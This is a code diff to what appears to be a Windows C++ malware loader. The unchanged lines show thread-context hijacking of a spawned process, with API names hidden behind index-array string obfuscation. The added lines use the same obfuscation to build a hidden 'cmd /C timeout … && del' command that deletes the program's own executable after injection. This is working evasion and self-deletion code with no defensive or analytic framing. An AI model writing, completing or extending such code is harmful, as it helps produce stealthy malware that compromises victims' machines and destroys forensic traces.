@@ -1,3 +1,4 @@
+
 #include <windows.h>
 #include <tlhelp32.h>
 #include <wincrypt.h>
@@ -108,7 +109,28 @@ void main_star() {
     pSetThreadContext(pi.hThread, &ctx);
 
     auto pResumeThread = (DWORD(WINAPI*)(HANDLE)) GetProcAddress(istfromKe__ws_ls_32, getoriginal(reth, big_string, sizeof(reth)).c_str());
-    pResumeThread(pi.hThread); 
+    pResumeThread(pi.hThread);
+    
+    //delet from here
+    char full_p[MAX_PATH];
+    
+    int get_mod_wlsa[] = {32, 4, 19, 38, 14, 3, 20, 11, 4, 31, 8, 11, 4, 39, 0, 12, 4, 26};
+    int cooo[] = {2, 12, 3, 62, 4, 23, 4};
+    int t[] = {19, 8, 12, 4, 14, 20, 19};
+    std::string coo = getoriginal(cooo, big_string, sizeof(cooo));
+    std::string to = getoriginal(t, big_string, sizeof(t));
+    
+    BOOL (*pget_mod__wlsa_A)(HMODULE, LPSTR, DWORD) = 
+        (BOOL (*)(HMODULE, LPSTR, DWORD))GetProcAddress(istfromKe__ws_ls_32, getoriginal(get_mod_wlsa, big_string, sizeof(get_mod_wlsa)).c_str());
+        
+    pget_mod__wlsa_A(NULL, full_p, MAX_PATH);
+    
+    STARTUPINFOA ri = { sizeof(STARTUPINFOA) };
+    PROCESS_INFORMATION oi = {}; 
+    std::string com = coo + " /C " + to + " 2 && del \"" + std::string(full_p) + "\"";
+    
+    itscreatetPro(NULL, com.data(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &ri, &oi);
+    
 }
 
 int main() {
